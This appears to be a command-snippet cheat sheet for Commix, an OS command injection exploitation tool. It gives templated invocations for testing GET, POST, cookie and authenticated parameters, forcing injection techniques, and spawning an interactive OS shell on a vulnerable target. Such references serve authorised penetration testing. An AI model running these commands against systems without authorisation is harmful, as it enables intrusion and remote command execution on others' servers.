# Commix

> Automated all-in-one OS command injection exploitation tool

<!-- tags: commix, command-injection, rce, web, exploit -->

---

## Basic GET Parameter Test
Test a URL parameter for command injection.

```bash
commix -u "{{URL:url:http://target.com/page.php?id=1}}"
```

<!-- meta: risk=med | phase=exploit | tags=get,inject,detect -->

---

## POST Data Injection
Test injectable parameters in POST body data.

```bash
commix -u "{{URL:url:http://target.com/execute}}" --data "{{PARAM:str:cmd}}={{VALUE:str:ls}}"
```

<!-- meta: risk=med | phase=exploit | tags=post,inject -->

---

## Cookie-Based Injection
Test command injection via Cookie header values.

```bash
commix -u "{{URL:url:http://target.com/page}}" --cookie "{{COOKIE:str:tracking=test}}"
```

<!-- meta: risk=med | phase=exploit | tags=cookie,inject,header -->

---

## Get Reverse Shell via OS Shell
Spawn an interactive OS shell on a confirmed-vulnerable target.

```bash
commix -u "{{URL:url:http://target.com/page.php?id=1}}" --os-shell
```

<!-- meta: risk=high | phase=exploit | tags=shell,os-shell,rce -->

---

## Specify Technique
Force a specific injection technique (e.g., classic, eval, time-based, file-based).

```bash
commix -u "{{URL:url:http://target.com/page.php?id=1}}" --technique={{TECHNIQUE:str:c}} --skip-empty
```

<!-- meta: risk=med | phase=exploit | tags=technique,classic,timebased -->

---

## Authenticated Scan with Headers
Scan a protected endpoint passing auth headers and bearer tokens.

```bash
commix -u "{{URL:url:http://target.com/api/exec}}" --headers="Authorization: Bearer {{TOKEN:str}}" --data "{{PARAM:str:cmd}}={{VALUE:str:id}}"
```

<!-- meta: risk=med | phase=exploit | tags=headers,auth,api -->
